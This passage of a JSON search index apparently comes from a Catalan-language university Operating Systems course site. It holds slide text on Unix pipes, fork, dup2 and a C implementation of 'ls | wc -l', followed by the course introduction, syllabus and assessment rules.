    "href": "slides/03-pipes.html#implementació-de-les-pipes",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Implementació de les Pipes",
    "text": "Implementació de les Pipes\nLes pipes es poden implementar com a buffers circulars basats en memòria assignada pel sistema operatiu. Aquestes pipes es coneixen com a pipes sense nom i són transitòries. Una pipe sense nom deixa d’existir quan tots els processos que la tenen assiganda acaben o tanquen els seus descriptors associats a la pipe.\n\n\n\nEls pipes es creen en el moment que s’obren mitjançant la crida a sistema pipe() (unistd.h) o amb la sintaxis |.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#creació-de-pipes",
    "href": "slides/03-pipes.html#creació-de-pipes",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Creació de Pipes",
    "text": "Creació de Pipes\nint pipe(int desc[2]);                                                                                                \nRETORNA:  0 on success                                                       \n         -1 on error:    errno = EMFILE (no free descriptors)                  \n                                 EMFILE (system file table is full)            \n                                 EFAULT (fd array is not valid)                \n\nLa crida a sistema pipe(), crea dos descriptors de fitxer. Un de lectura (desc[0]) i un d’escriptura (desc[1]).\nLa informació que s’escriu per desc[1] es llegeix per desc[0].\nUna vegada el pipe() s’ha creat; per poder utilitzar-lo els processos han d’heretar aquests descriptors del procés pare.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#comunicació-unidireccional-i",
    "href": "slides/03-pipes.html#comunicació-unidireccional-i",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Comunicació unidireccional (I)",
    "text": "Comunicació unidireccional (I)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#comunicació-unidireccional-ii",
    "href": "slides/03-pipes.html#comunicació-unidireccional-ii",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Comunicació unidireccional (II)",
    "text": "Comunicació unidireccional (II)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#comunicació-unidireccional-iii",
    "href": "slides/03-pipes.html#comunicació-unidireccional-iii",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Comunicació unidireccional (III)",
    "text": "Comunicació unidireccional (III)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#comunicació-unidireccional-iv",
    "href": "slides/03-pipes.html#comunicació-unidireccional-iv",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Comunicació unidireccional (IV)",
    "text": "Comunicació unidireccional (IV)\nvoid main(){\n   int fd[2]; // Descriptors associats a una pipe  \n   pid_t   pidFill;\n    /* El primer element de la matriu (fd[0]) està configurat i obert per \n    a la lectura, mentre que el segon element està configurat i obert per \n    escriure (fd[1]. Totes les dades que viatgen per la pipe es mouen \n    pel nucli. */\n    pipe(fd); pidFill = fork();\n     if (pidFill == -1){\n        perror(\"fork\"); exit(1);\n     } else if (pidFill == 0){\n         /*El procés fill tanca la escriptura per la pipe*/ close(fd[1]);\n     } else {\n         /* El procés pare tanca la lectura per la pipe */ close(fd[0]);\n     }\n }",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#comunicació-bidireccional-v",
    "href": "slides/03-pipes.html#comunicació-bidireccional-v",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Comunicació bidireccional (V)",
    "text": "Comunicació bidireccional (V)\n\nEl procés pare necessitarà dues pipes (una per cada direcció).\nEl pare fa un fork() creant una còpia del pare i duplicant els descriptors de fitxers associats a les dues pipes.\nEl procés pare tanca la lectura de la sortida del pipe1.\nEl procés fill tanca l’escriptura a l’entrada del pipe1.\nEl procés fill tanca la lectura de la sortida del pipe2.\nEl procés pare tanca l’escriptura a l’entrada del pipe2.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#comunicació-bidireccional-pipes",
    "href": "slides/03-pipes.html#comunicació-bidireccional-pipes",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Comunicació bidireccional (Pipes)",
    "text": "Comunicació bidireccional (Pipes)\n\n\nPipe 1\n\n\nPipe2",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#escriptura-en-les-pipes",
    "href": "slides/03-pipes.html#escriptura-en-les-pipes",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Escriptura en les pipes",
    "text": "Escriptura en les pipes\n\nL’escriptura a les pipes es realitza utilitzant la crida a sistema: write() o la funció fprintf().\nSi un procés escriu en un pipe que tingui el descriptor de lectura tancat, write() falla i s’envia un senyal SIGPIPE.\nSi un procés escriu menys bytes dels que admet el pipe, l’escriptura es realitza de forma atòmica.\nSi s’intenta escriure sobre un pipe ple; el procés es queda bloquejat fins que el pipe es buidi (un altre procés ha llegit les dades) i llavors s’acaba l’escriptura.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#lectura-de-les-pipes",
    "href": "slides/03-pipes.html#lectura-de-les-pipes",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Lectura de les pipes",
    "text": "Lectura de les pipes\n\nLa lectura dels pipes es fan mitjançant la crida a sistema: read() o la funció fscanf().\nSi un procés llegeix en un pipe que tingui el descriptor tancat, retorna un 0, indicant la condició de final de fitxer.\nSi un procés llegeix d’un pipe buit es bloqueja fins que les dades estiguin disponibles.\nSi un procés intenta llegir més dades que les disponibles en un pipe, es llegeixen els disponibles i es retorna el nombre de bytes llegits.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-i",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-i",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple: Lector-Escriptor (I)",
    "text": "Exemple: Lector-Escriptor (I)\n\n\nLector\nint main() {\n    int fd[2];\n    pid_t p1 = fork();\n\n    if (p1 &gt; 0) {\n    {\n      close(fd[1]);  \n      char buf[100];\n      read(fd[0], buf, sizeof(buf));\n      printf(\"MSG: %s\\n\",buf);\n      close(fd[0]);  \n    }\n\nEscriptor\nelse if (p1 == 0) {\n    close(fd[0]);  \n    char msg[5];\n    sprintf(msg, \"msg1\");\n    write(fd[1], msg, strlen(msg));\n    close(fd[1]);  \n    exit(0);\n  }\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-ii",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-ii",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple: Lector-Escriptor (II)",
    "text": "Exemple: Lector-Escriptor (II)\n\n\nPare\nint main() {\n  int fd[2]; int r = pipe(fd);\n  pid_t p1 = fork();\n  if (p1 == 0) { /*Fill*/ }\n  close(fd[1]);\n  char buf[100];\n  while(read(fd[0],&buf,sizeof(buf))){\n    printf(\"I got a message! \n      It was %s\\n\", buf);\n    }\n  printf(\"No more messages :(\\n\");\n  close(fd[0]);\n}\n\nFill\nclose(fd[0]);\nchar msg[5];\nsprintf(msg,\"msg1\");\nssize_t nw = write(fd[1], \n    msg, strlen(msg));\nsprintf(msg,\"msg2\");\nnw = write(fd[1], \n    msg, strlen(msg));\nclose(fd[1]); \nwhile(1);\nexit(0);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-iii",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-iii",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple: Lector-Escriptor (III)",
    "text": "Exemple: Lector-Escriptor (III)\n\n\nPare\nint main() {\n  int fd[2]; int r = pipe(fd);\n  pid_t p1 = fork();\n  if (p1 == 0) { /*Fill*/ }\n  close(fd[1]);\n  char buf[100];\n  while(read(fd[0],&buf,sizeof(buf))){\n    printf(\"I got a message! \n      It was %s\\n\", buf);\n    }\n  printf(\"No more messages :(\\n\");\n  close(fd[0]);\n}\n\nFill\nclose(fd[0]);\nchar msg[5];\nsprintf(msg,\"msg1\");\nssize_t nw = write(fd[1], \n    msg, strlen(msg));\nsprintf(msg,\"msg2\");\nnw = write(fd[1], \n    msg, strlen(msg));\n//close(fd[1]);  &lt;-\nwhile(1);\nexit(0);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-lector-escriptor-iv",
    "href": "slides/03-pipes.html#exemple-lector-escriptor-iv",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple: Lector-Escriptor (IV)",
    "text": "Exemple: Lector-Escriptor (IV)\n\n\nPare\nvoid sigpipe_handler(int signum) {\n    printf(\"SIGPIPE...\\n\");\n    exit(EXIT_SUCCESS);\n}\nint main() {\n  int fd[2]; int r = pipe(fd);\n  pid_t p1 = fork();\n  if (p1 == 0) { /*Fill*/ }\n    close(fd[1]);  \n    signal(SIGPIPE, sigpipe_handler);\n    write(fd[1], \"Hello\", 5);\n}\n\nFill\nclose(fd[0]);  \nsleep(2);  \nclose(fd[1]);  \nexit(EXIT_SUCCESS);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#redirecció-i-duplicats",
    "href": "slides/03-pipes.html#redirecció-i-duplicats",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Redirecció i duplicats",
    "text": "Redirecció i duplicats\nPer utilitzar pipes amb la crida a sistema exec i simular el comportament del sistema operatiu quan interactuem amb la shell, necessitem redireccionar la sortida i l’entrada de la pipe a descriptors de fitxers predefinits assignats a cada procés.\n\n\n\n\nTancant els descriptors estàndard.\nDuplicant els descriptors de fitxer utilitzant la crida a sistema dup()(unistd.h).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#dup-i-dup2",
    "href": "slides/03-pipes.html#dup-i-dup2",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "dup() i dup2()",
    "text": "dup() i dup2()\nint dup(int fdold)\nint dup2(int fdold, int fdnew)\n\ndup: utilitza el descriptor de fitxer lliure més petit per duplicar el descriptor de fitxer fdold.\ndup2: fa que fdnew sigui una còpia de fdold, tancant fdold si és necessari.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-i",
    "href": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-i",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple a linux: ls | wc -l (I)",
    "text": "Exemple a linux: ls | wc -l (I)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-ii",
    "href": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-ii",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple a linux: ls | wc -l (II)",
    "text": "Exemple a linux: ls | wc -l (II)\n\nEl procés 1 farà un recobriment de la comanda ls i l’executarà. Per defecte la comanda ls imprimeix per stdout el llistat de fitxers i directoris del directori actual.\nEn aquest cas la pipe (|) indica que ls no escriurà per stdout i ho farà per la pipe. D’aquesta manera no veurem el llista de fitxers a la terminal, seran enviats a la pipe.\nEl procés 2 farà un recobriment de la comanda wc -l, aquesta comanda compta el nombre de línies rebudes per stdin. En aquest cas, com tenim la comanda precedida d’una pipe… El procés redireccionarà stdin a la pipe. Per tant, llegirà el contingut escrit per la comanda ls.\nPer defecte la comanda wc -l escriu a stdout, com ara no hi ha cap més pipe. Aquesta sortida no es redirecciona i per tant únicament veurem el resultat per stdout. És a dir, el nombre de fitxers i directoris del directori actual.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-iii",
    "href": "slides/03-pipes.html#exemple-a-linux-ls-wc--l-iii",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Exemple a linux: ls | wc -l (III)",
    "text": "Exemple a linux: ls | wc -l (III)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#implementació-amb-c-ls-wc--l",
    "href": "slides/03-pipes.html#implementació-amb-c-ls-wc--l",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Implementació amb C ls | wc -l",
    "text": "Implementació amb C ls | wc -l\nint main(int argc, char *argv[]){\nint fd[2];\nchar *p1[] = {\"ls\", NULL};\nchar *p2[] = {\"wc\", \"-l\", NULL};\nif (pipe(fd)&lt;0){ perror(\"Error de creació del pipe fd[]\");exit(-1);}\n\nint pid1;int pid2;\nswitch (pid1 = fork()){\n    case -1: perror(\"Error fork()\"); exit(-2); break;\n    case 0: //@TODO\n}\nswitch (pid2 = fork()){\n    case -1: perror(\"Error fork()\"); exit(-2); break;\n    case 0: //@TODO\n}\nwaitpid(pid1,0,0); \nwaitpid(pid2,0,0);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#implementació-amb-c-ls-wc--l-1",
    "href": "slides/03-pipes.html#implementació-amb-c-ls-wc--l-1",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Implementació amb C ls | wc -l",
    "text": "Implementació amb C ls | wc -l\nFill 1 (ls)\nif (close(pfd[0]) == -1)                    \n    perror(\"close 1\");\n\n    /* Duplicate stdout on write end of pipe; \n    close duplicated descriptor */\n\n    if (fd[1] != STDOUT_FILENO) {              \n        if (dup2(fd[1], STDOUT_FILENO) == -1)\n            perror(\"dup2 1\");\n        if (close(fd[1]) == -1)\n            perror(\"close 2\");\n    }\n\n    execlp(\"ls\", \"ls\", (char *) NULL);          \n    perror(\"execlp ls\");",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#implementació-amb-c-ls-wc--l-2",
    "href": "slides/03-pipes.html#implementació-amb-c-ls-wc--l-2",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Implementació amb C ls | wc -l",
    "text": "Implementació amb C ls | wc -l\nFill 2 (wc -l)\n   if (close(fd[1]) == -1)                    \n        perror(\"close 3\");\n\n    /* Duplicate stdin on read end of pipe; \n    close duplicated descriptor */\n\n    if (fd[0] != STDIN_FILENO) {              \n        if (dup2(fd[0], STDIN_FILENO) == -1)\n            perror(\"dup2 2\");\n        if (close(fd[0]) == -1)\n            perror(\"close 4\");\n    }\n\n    execlp(\"wc\", \"wc\", \"-l\", (char *) NULL);\n    perror(\"execlp wc\");",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#implementació-amb-c-ls-wc--l-3",
    "href": "slides/03-pipes.html#implementació-amb-c-ls-wc--l-3",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Implementació amb C ls | wc -l",
    "text": "Implementació amb C ls | wc -l\n\nCom és que el programa no acaba mai?\n\nEl procés pare ha de tancar els descriptors de fitxer que no utilitza. Si no els procés fill lector de la pipe no acaba mai. Ja que no tots els processos han tancat els descriptors de fitxer associats a la pipe.\n// Pare\nif (close(fd[0]) == -1)\n    perror(\"close\");\nif (close(fd[1]) == -1)\n    perror(\"close\");\n\nwaitpid(pid1,0,0);\nwaitpid(pid2,0,0);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/03-pipes.html#això-és-tot-per-avui",
    "href": "slides/03-pipes.html#això-és-tot-per-avui",
    "title": "Pipes i redirecció d’entrada/sortida",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\nLes pipes són mecanismes de comunicació entre processos que permeten la transmissió de dades d’un procés a un altre. Es poden utilitzar per a comunicació unidireccional o bidireccional. Cal comprendre com crear pipes, escriure i llegir dades en elles, i com utilitzar-les en la redirecció d’entrada/sortida de processos en execució.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Pipes"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qui-soc",
    "href": "slides/01-introduction.html#qui-soc",
    "title": "Introducció",
    "section": "Qui soc?",
    "text": "Qui soc?\n\n\nCurrículum\n\nEnginyer i Doctor en Informàtica per la UdL.\n\nDocència\n\nProfessor agregat a la UdL des de 2019.\nSistemes Operatius (GTIDIC, GEI).\nAdministració de Sistemes (GTIDIC, GEI).\nDesenvolupament d’Aplicacions per a dispositus mòvils (GTIDIC).\nCloud Compunting (Master in Health Data Science)\nHigh Performance Computing (Màster en Enginyeria Informàtica)\n\n\nRecerca\n\nMembre del grup de recerca Grup de computació distribuïda des de 2012 (Universitat de Lleida).\nMembre del grup de recerca Essence: Data Engineering & Distributed Computing Systems des de 2022 (Universitat de Glasgow).\nComputació distribuïda: Cloud, Edge i Fog Computing.\nCamps d’aplicació: Salut electrònica i Energia.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qui-sou",
    "href": "slides/01-introduction.html#qui-sou",
    "title": "Introducció",
    "section": "Qui sou?",
    "text": "Qui sou?\nQuè us ha portat fins aquí?\n\n\n\n\nPer conèixer-vos una mica millor, m’agradaria que responguéssiu 4 preguntes de forma breu i concisa, que m’ajudaran a entendre les vostres motivacions i expectatives respecte a aquesta assignatura. Us deixo 5 minuts per respondre-les.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#presentació",
    "href": "slides/01-introduction.html#presentació",
    "title": "Introducció",
    "section": "Presentació",
    "text": "Presentació\n\nBenvinguts a Sistemes Operatius\n\n\n\nchar text[] = \"Aquesta NO és una assignatura\\n\\\n      centrada en la  programació\\n\\\n      PERÒ programarem MOLT!\\n\";\nssize_t bytes = write(1, text, sizeof(text) - 1);\n\ntext=\"Aquesta assignatura NO és un MONÒLEG.\" \necho $text\n\n\nVull sessions interactives, participatives,… pregunteu, interrompeu-me…\n\n\n\n\n\nSi bé aquesta assignatura no se centra exclusivament en l’aprenentatge de la programació, la pràctica de codificació serà fonamental. Un sistema operatiu és, en essència, un programa extremadament complex, i per entendre’n el funcionament, cal aprofundir en el seu codi font.\nPer això, la nostra eina principal serà el llenguatge de programació C, ja que és el llenguatge amb què s’han construït sistemes operatius històrics i de referència com Linux i Unix. A més, per comprendre com el codi d’alt nivell es comunica amb el maquinari, és crucial entendre com es tradueix a codi màquina; aquí és on la comprensió del llenguatge Assembler es torna imprescindible.\nTot i que llenguatges més moderns com Rust o Go s’utilitzen cada vegada més en el desenvolupament de sistemes, el C continua sent el pilar sobre el qual es construeix la major part del nostre món digital.\nFinalment, vull que aquestes sessions siguin realment interactives i participatives. Si us plau, no dubteu a interrompre’m i a plantejar qualsevol pregunta o dubte que tingueu en el moment. La meva intenció no és fer un monòleg, sinó crear un diàleg constructiu i col·laboratiu entre tots.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#coneixement-previ-i",
    "href": "slides/01-introduction.html#coneixement-previ-i",
    "title": "Introducció",
    "section": "Coneixement previ (I)",
    "text": "Coneixement previ (I)\nQuin sistema operatiu utilitzeu/coneixeu?\n\n\n\n\nPer començar, m’agradaria saber quin sistema operatiu utilitzeu o coneixeu. Això ens ajudarà a entendre el nivell de familiaritat que teniu amb diferents sistemes i ens permetrà adaptar millor el contingut del curs a les vostres necessitats. Escaneja el codi QR i introdueix les vostres respostes, podeu respondre més d’una opció si coneixeu diversos sistemes operatius.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#objectius-globals",
    "href": "slides/01-introduction.html#objectius-globals",
    "title": "Introducció",
    "section": "Objectius (Globals)",
    "text": "Objectius (Globals)\n\nEntendre els Sistemes Operatius: Com estan dissenyats i quins components (o mòduls) els formen.\nConeixer els seus serveis: Quines funcions proporcionen a usuaris i aplicacions.\nAprendre a programar amb ells: Com utilitzar els serveis del sistema operatiu per crear aplicacions de manera eficient.\nAvaluar críticament les seves polítiques: Analitzar com el sistema operatiu gestiona els seus recursos, com la memòria, i comparar diferents mètodes per fer-ho.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#objectius-específics",
    "href": "slides/01-introduction.html#objectius-específics",
    "title": "Introducció",
    "section": "Objectius (Específics)",
    "text": "Objectius (Específics)\n\nConèixer els sistemes operatius Unix/Linux (en concret Debian).\nInterioritza les bases de programació C per millora les vostres habilitats en altres llenguatges.\nDesenvolupar programari a nivell de sistema en el llenguatge de programació C comprenent al mateix temps com funcionen els Sistemes Operatius basats en Unix.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#temari",
    "href": "slides/01-introduction.html#temari",
    "title": "Introducció",
    "section": "Temari",
    "text": "Temari\n\nIntroducció als Sistemes Operatius.\nEstructura dels Sistemes Operatius.\nGestió i comunicació de processos i threads.\nSincronització i Planificador de tasques.\nInterbloqueig.\nGestió de Memòria.\nScripting.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#metodologia",
    "href": "slides/01-introduction.html#metodologia",
    "title": "Introducció",
    "section": "Metodologia",
    "text": "Metodologia\n\nBasada en Aprenentatge SIGNIFICATIU, GUIAT i ACTIU.\n\n\nSessions teòriques: S’introdueixen continguts teòrics de l’assignatura i als estudiants, i també s’hi discuteixen les implicacions pràctiques.\nSessions pràctiques: sessions autoguiades de laboratori, sessions de live coding o resolució de problemes.\nTreball autònom: els estudiants han d’aplicar els coneixements adquirits a les sessions teòriques i pràctiques per acabar els problemes, laboratoris i projectes proposats. A més, han de realitzar les lectures dels apunts i consultar la bibliografia recomanada.\n\n\nLes sessions teòriques i pràctiques estan combinades en les sessions de 3h de durada.\n\n\nLa idea és que no us dediqueu només a memoritzar conceptes, sinó que connecteu la nova informació amb el que ja sabeu. Tot i que a la pràctica fareu moltes coses per vosaltres mateixos, jo seré aquí per guiar-vos. Us donaré les eines, el suport i les indicacions necessàries per anar avançant.Volem que sigueu protagonistes del vostre procés d’aprenentatge. No us limitareu a escoltar-me, sinó que fareu coses, resoldreu problemes i creareu projectes.\n\nSessions teòriques: Aquí introduirem els conceptes clau i els fonaments teòrics. Però no ens quedarem només amb la teoria; també discutirem com s’apliquen aquests conceptes al món real.\nSessions pràctiques: Farem sessions de laboratori on programareu, farem exercicis de live coding junts per resoldre problemes en directe i practicareu les habilitats que necessiteu.\nTreball autònom: La major part de l’aprenentatge real es farà fora de l’aula. Us demanaré que acabeu els laboratoris, resolgueu els exercicis pendents i treballeu en els projectes. També serà important que reviseu els apunts i, si cal, consulteu la bibliografia recomanada.\n\nLes sessions teòriques i pràctiques estaran combinades. La idea és que no hi hagi una desconnexió entre la teoria i la pràctica. Com tenim sessions de 3 hores, podrem dedicar una part a la teoria i l’altra a la pràctica, tot integrat en una sola experiència d’aprenentatge.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#criteris-davaluació",
    "href": "slides/01-introduction.html#criteris-davaluació",
    "title": "Introducció",
    "section": "Criteris d’Avaluació",
    "text": "Criteris d’Avaluació\n\n\n\n\n\n\n\n\n\n\n\nAcr.\nActivitat d’avaluació\nPes\nNota mínima\nEn grup\nRecuperable\n\n\n\n\nE1\n1er Parcial\n35%\nNO\nNO\nSI\n\n\nE2\n2on Parcial\n35%\nNO\nNO\nSI\n\n\nP\nPràctiques\n25%\nNO\nSI \\(\\leq 2\\)\nNO\n\n\nPart\nSeguiment i Participació\n5%\nNO\nNO\nNO\n\n\n\n\nAquesta assignatura s’avaluara de forma tradicional mitjançant dos exàmens parcials (E1 i E2) que representen el 70% de la nota final. A més, hi haurà pràctiques que contribuiran amb un 25% a la nota final, i un component de seguiment i participació que valdrà un 5%.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#exàmens",
    "href": "slides/01-introduction.html#exàmens",
    "title": "Introducció",
    "section": "Exàmens",
    "text": "Exàmens\nEls exàmens parcials (E1 i E2) són proves escrites que avaluen els coneixements teòrics i pràctics adquirits durant el curs.\n\nSón proves individuals i presencials.\nEs realitzaran en les dates establertes al calendari acadèmic.\nNo es permet l’ús de cap dispositiu electrònic (telèfons mòbils, ordinadors portàtils o tauletes).\nSi es permet l’ús d’un resum de continguts, que ha de ser un document escrit a mà i no pot excedir una fulla DIN A4 (per davant i per darrere).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#recuperació",
    "href": "slides/01-introduction.html#recuperació",
    "title": "Introducció",
    "section": "Recuperació",
    "text": "Recuperació\n\nEls parcials són recuperables mitjançant proves escrites addicionals que es realitzaran durant la setmana de recuperació.\nSi un estudiant necessita recuperar un únic parcial (E1 o E2), podrà fer una prova específica per a aquest parcial. La qualificació obtinguda en aquesta recuperació substituirà la nota del parcial corresponent.\nSi un estudiant necessita recuperar ambdós parcials, haurà de realitzar dues proves separades, una per a cada parcial (E1 i E2). Les qualificacions obtingudes en cadascuna d’aquestes proves de recuperació substituiran les notes originals dels parcials respectius.\nÉs important notar que no hi haurà un model d’examen unificat per a la recuperació; cada prova de recuperació se centrarà exclusivament en els continguts del parcial al qual correspon.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#pràctiques",
    "href": "slides/01-introduction.html#pràctiques",
    "title": "Introducció",
    "section": "Pràctiques",
    "text": "Pràctiques\n\nLes pràctiques de l’assignatura impliquen treball fora de l’aula i s’han de lliurar de forma estricta en les dates establertes.\nLa seva avaluació es farà mitjançant rúbriques de correcció, que estaran disponibles per als estudiants amb antelació.\nEl professorat pot entrevistar els estudiants per verificar l’autoria. Si es detecta que una activitat no ha estat realitzada per l’estudiant la seva qualificació serà 0.\nQualsevol entrega fora del termini establert es considerarà no vàlida i es qualificarà amb un 0.\nCadascuna pot tenir una ponderació específica indicada a la descripció de l’activitat.\nAquestes pràctiques no són recuperables.\nTot i ser activitats en grup, cada estudiant pot obtenir una nota diferent en funció de la seva participació i aportacions individuals al grup.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#seguiment-i-participació",
    "href": "slides/01-introduction.html#seguiment-i-participació",
    "title": "Introducció",
    "section": "Seguiment i Participació",
    "text": "Seguiment i Participació\n\n\n\n\n\n\n\nRúbrica d’Avaluació\n\n\n\n\n\n\n\n\n\n\n\nPunts\nParticipació Presencial\nParticipació en Fòrums\nActivitats Sessió\n\n\n\n\n10\nContribucions excepcionals,enriqueix la discussió.\nLíder en discussions, promou debat.\nQualitat excepcional, supera expectatives.\n\n\n9\nComentaris rellevants, mostra comprensió, escolta activament.\nRespostes significatives.\nAlta qualitat, treball precís.\n\n\n8\nContribucions regulars, interactua amb companys.\nPublicacions rellevants, contribueix constructivament.\nCompleix tots requisits amb precisió.\n\n\n7\nParticipa amb una comprensió bàsica.\nCompleix mínims, contribucions breus.\nQualitat inconsistent però acceptable.\n\n\n5-6\nPoca freqüència, comentaris superficials.\nPublicacions rares, poc profundes.\nAlgunes activitats incompletes.\n\n\n1-4\nNomés participa si se li demana.\nPublicacions irrellevants.\nRarament completa activitats.\n\n\n0\nEvita participar, distret.\nPublicacions fora de tema.\nNo lliura activitats.\n\n\n\n\n\n\n\n\nL’assistència passiva no es puntua.\n\n\nAquest component d’avaluació està dissenyat per fomentar la participació activa i el compromís amb l’assignatura. La participació no es limita només a l’assistència a classe, sinó que també inclou la contribució en discussions, fòrums en línia i activitats relacionades amb les sessions. Tota participació ha de ser rellevant i constructiva per ser valorada positivament. En aquesta rúbrica, es detallen els criteris específics que s’utilitzaran per avaluar la participació dels estudiants en diferents àmbits.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bonus-1",
    "href": "slides/01-introduction.html#bonus-1",
    "title": "Introducció",
    "section": "Bonus 1",
